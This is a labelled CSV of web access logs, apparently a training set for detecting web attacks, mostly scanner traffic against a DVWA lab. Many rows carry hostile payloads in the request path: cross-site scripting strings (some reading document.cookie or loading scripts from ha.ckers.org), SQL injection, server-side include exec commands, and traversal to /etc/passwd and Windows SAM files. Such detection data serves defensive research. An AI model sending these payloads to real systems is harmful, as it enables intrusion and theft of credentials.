Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:22:02 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,301,708,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/?Login=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?password=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/?username=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,////////../../../../../../etc/passwd,HTTP/1.1,400,485,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:49 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/?username=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:47 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,POST,/login.php?query=query+OR+1%3D1+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/images/spanner.png?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,693,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/?Login=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,HTTP/1.1,302,300,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>,HTTP/1.1,404,516,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:33 +0000,GET,/docs/DVWA_v1.3.pdf?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,422251,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/dvwa/?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,1674,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:47 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,POST,/login.php?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,302,281,2.0
213.234.14.220,-,-,13/Dec/2015:09:21:08 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
95.32.85.147,-,-,13/Dec/2015:14:33:22 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
ix-sd11-26.ix.netcom.com,-,-,01/Jul/1995:00:07:31 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?username=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/instructions.php?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt?query=query%27+OR+%271%27%3D%271%27+--+,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/login.css?query=query%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/login.css?query=query%27+OR+%271%27%3D%271%27+--+,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/sitemap.xml?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:33 +0000,GET,/web.config~,HTTP/1.1,404,502,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/?username=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:49 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
178.129.14.85,-,-,13/Dec/2015:08:05:09 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt?query=query%27+UNION+ALL+select+NULL+--+,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:22:02 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/administrator/gallery/gallery.php?directory=\\\""<script>alert(document.cookie)</script>",HTTP/1.1,404,524,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/.../.../.../.../.../.../.../.../.../boot.ini,HTTP/1.1,404,536,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,"/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\\\""><script>alert('Vulnerable')</script>,/system/status/session",HTTP/1.1,404,506,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:06 +0000,GET,/instructions.php,HTTP/1.1,200,14305,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
92.100.31.117,-,-,13/Dec/2015:11:44:02 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/?Login=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/dvwaPage.js?query=query%27+OR+%271%27%3D%271%27+--+,HTTP/1.1,200,1296,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/login.css?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/css/main.css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,200,4278,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/sitemap.xml?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>,HTTP/1.1,404,499,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/setup.php?query=query%22+UNION+ALL+select+NULL+--+,HTTP/1.1,200,4347,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini,HTTP/1.1,404,521,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._,HTTP/1.1,404,537,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/?user_token=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
89.232.118.5,-,-,13/Dec/2015:13:18:31 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/add_event_listeners.js?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,858,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/phprocketaddin/?page=../../../../../../../../../../boot.ini,HTTP/1.1,404,506,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/?user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:45 +0000,GET,/about.php?query=pkLjMgRgwKwjyAmdqvpmSiMiXDrylLMQroiDZkmhQaTjHQICXnwZkUulwrKVSFThdAsVMddNGTkjfKOflrbiQaVbYMAMftXCPAfaQvexexdGFonjIaEiWXZkYBUoLhbgFxeoTUYXrtfNdlQPcMmYfUNicrvGJZFDTaDTMOAIvGHItQhPLbciJQYWDktcvcdJOxSORcLmcHHvxRQurULOnxqCTTxPjCjURCxtIFSKitZpgwoFkttgGsnSbCsQpCMkCSDeuWlOdUVlWXJoXCVeNGNVUlURFAecgHCkNGxWBhEkDDdjvrFXLnqSEfOqbRnXOffjLUYRpdmwiSJIPbveqLdrKudfnxyrsHGNOmZnGfBcIHmsLVGHuCKWQMfjmCtshOyNSWmywVkihWQLEXniKDthZotWNprSsmBVLGqBmnVMMhgeWKHGrmsboCEvCgsABFuxbebycyHnBEvdkExhdhZJNUSyLBAupySIFkJFLQBnnFHsXmrMAeflnSGPyCBdggXLnLPGIRhweDWLUJAaLYHGDRbupMbZqyFXXZnqWmkYYUlcDoxXQEUTrXdqFyLVnWFxtNAKBLbGKaRMowLGBgGmvDUbPbhYXAwQqsDfTnpjpWSqBjqDihsJHlRHpqJmKPmwJgbSVgPcoHsKpGKZnJvQyKoFLiRVISDAtQnTOyxwIdpdibESsYCZYaWAHhlCGsOCkOXKumvhZjYrPYMjiRvJfUtfJIcUMVdwSlrFtvacHAaTGYqARGygImrFrTVvuPHdWtroQWZGqLFwEEalhvjmkiFgNwDrfuDZWNsgnEALKKQaUGJajBMZsfyNsNGBXplEUkjrPbvTicaMdIUXLgLMnaoLaXMhJBqvnRmVWefrDCfCbgfYshfSpQCPTLWwyuZEYylbPFZKmpxrEuJCkRGWkyNfuWMiHYrDfQhkZQkujgETCkCeMjVopdRXbegdCSXtBGmhEcfJsmsNDyVJsNvOjTbKZmNhBSKWfTXoKYaaGZBOZDektAjomCujqqLRUgFeATMrpqqhCydreqvfCRbqOFUtqNYvgvfGpCStpyNNdlFWvJyDTSMAZMsBRmeujnLZtnyGOfwUVOCcpVLewNVZQQOFNfgYAxcUcNjdbGgTTVWuexLkVUCPqtiJOYFMyfZEaotjdFeFXTQuRaRbpkWTAEtNBFyaqaxwfYGRgtniJYZxOLqKIUoUngKppFLRdayLXuXZfgOhNQIaXkqYSQTEDXwklLKfWDQMhGRVdcUQHoCRssshDmgZWOkpCjwhBvZguEyvKkkHxysUyGBSaWmFFwlrkwWtTdiEnxcXWfaIJKUJZjHkVQploxiAylKswgTBJDDqGLoiViBENgxSUkxgINVSfNiAWlZQWocndlEiBmoJyrXKgdDjjrMNFYgTGpkRHMYXcUDMsNRgwBVaPSoIdFgWQYFSPWuQIKWAHIvaMJLGLhexXUdnShOuFORcdcAeVjcWmrYhRbCOjxcCDnDSZYxawDswRLTbTBaIlpuaBoYBjHlWTruDcxQbPWxHlGOVyMiqhPlcrLXdeUcPoksuXvYexKaKuPyQpmpjFvQhTGGYdAoTsAufsXdmaQaHnmKaWUyQmbyvWnKsgOHuBDMBMCcPPkNdnUvJBtfYRnblmcgHxUPMEcbqITDbhksvLvZinxamTvwWegUukWWVgpIYxnqBVyxSIRHbuyhXUKvByVtVDqpYFOwLtPLuqQWAAZcwJXkXdCowoIemgGkObxuErhGWBeJtyRBwyDXWEEillxdhQBEhCAnfaIJmxUpoFfiBtIYRWlXDLVmeAKRsgtfsLxccANuDJFnvMvTtgXAupPhcOjIiQVuYIaaCWujBnliqsUBqlagaFgeBLJjYnwJhSDrAQlhHdqVdcSaxruhamIfIyFOSUuImgbgPHoyyswZAGfXoFucOLQAbFUGWoaPPnrXvLyqytdAIcJgtUuDHYKwrgHGPkEfjEVMfRAFXqmcqYlcbOrXahdBOigAbjVhkaInLIpWKeCLnVEsVJEJorjFseFoOLCmXuDqhIuyHeVLDFTtlQAhVJjyEhssjGeWbwwIPApgYaulahGvgNEQbHpZVIhDO,HTTP/1.1,200,6093,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,301,718,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/?password=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,HTTP/1.1,302,300,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?Login=%22OR+%221%22%3D%221,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>,HTTP/1.1,404,504,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1.asp?n=../../boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,501,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:05 +0000,GET,/login.php,HTTP/1.1,200,1937,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?password=1%27+OR+1+OR+1%3D%27,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/?Login=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/favicon.ico?query=query+OR+1%3D1+--+,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/main.css?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,200,4278,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
177.98.255.56,-,-,13/Dec/2015:07:17:13 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:03 +0000,GET,/?username=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&user_token=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&Login=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&password=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:58 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:59 +0000,GET,/?username=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/emailfriend/emailnews.php?id=\\\""<script>alert(document.cookie)</script>",HTTP/1.1,404,516,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
192.162.212.213,-,-,13/Dec/2015:10:39:24 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,200,9319,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/?password=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>,HTTP/1.1,404,523,1.0
92.37.231.110,-,-,13/Dec/2015:09:15:11 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
